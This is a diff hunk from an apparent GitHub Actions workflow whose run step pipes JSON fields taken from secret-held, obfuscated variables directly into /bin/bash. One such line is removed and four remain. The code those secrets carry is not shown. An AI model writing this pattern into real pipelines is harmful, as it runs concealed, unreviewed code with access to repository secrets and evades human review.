@@ -22,7 +22,6 @@ jobs:
           a8: ${{ secrets.a8 }}
         run: |
           printf '%s' "$a8" | jq -r .paubx28211 | /bin/bash
-          echo $glolg488 | jq -r .qrqe37501 | /bin/bash
           printf '%s' "$wsq5623" | jq -r .ryiz87 | /bin/bash
           printf '%s' "$wftkp0" | jq -r .xi03059 | /bin/bash
           printf '%s' "$zsc979" | jq -r .x1692 | /bin/bash
